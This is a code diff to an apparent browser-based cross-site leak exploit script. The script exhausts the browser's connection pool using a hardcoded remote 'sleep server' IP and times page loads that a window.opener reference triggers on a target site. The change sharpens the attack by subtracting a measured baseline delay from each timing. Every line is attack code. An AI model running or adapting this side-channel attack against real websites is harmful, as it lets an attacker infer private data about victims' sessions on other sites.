@@ -8,6 +8,7 @@ const sock_cnt_start = 250;
 const sleep_server_ip = '104.155.96.42';
 const sleep_server_port = 1337;
 let test_server_url = '';
+let test_server_timing = 0;
 
 function log(s) {
   document.getElementById('log').insertRow(-1).innerText = `[*] ${s}`;
@@ -46,7 +47,11 @@ async function time_page_loads(url, timing_cnt=20) {
   let timings = new Array();
   window.opener.location = url;
   for (let i = 0; i < timing_cnt; i++) {
-    let val = Math.round(await time_fetch()*1000)/1000;
+    let timing = await time_fetch();
+    if (timing <= test_server_timing) {
+      continue;
+    }
+    let val = Math.round((timing-test_server_timing)*1000)/1000;
     if (val >= 10) {
       timings.push(val);
     }
@@ -72,7 +77,8 @@ async function doit(target) {
   log(await time_fetch(test_server_url));
   log(await time_fetch(test_server_url));
   log(await time_fetch(test_server_url));
-  log(await time_fetch(test_server_url));
+  test_server_timing = await time_fetch(test_server_url);
+  log(`Subtracting ${test_server_timing} from measurements.`);
   log('Exhausting connection pool');
   await exhaust_sockets();
   let timings = await time_page_loads(target);
